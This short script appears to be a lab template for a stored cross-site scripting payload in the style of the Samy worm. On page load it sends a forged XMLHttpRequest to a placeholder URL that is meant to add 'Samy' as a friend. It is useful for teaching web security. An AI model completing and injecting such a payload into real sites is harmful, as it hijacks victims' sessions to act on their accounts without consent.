<script type="text/javascript">
window.onload = function () {
    var Ajax=null;
    // XXXX is to be filled with a URL that 
    // triggers the request to add Samy as a friend
    var sendurl=XXXX
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>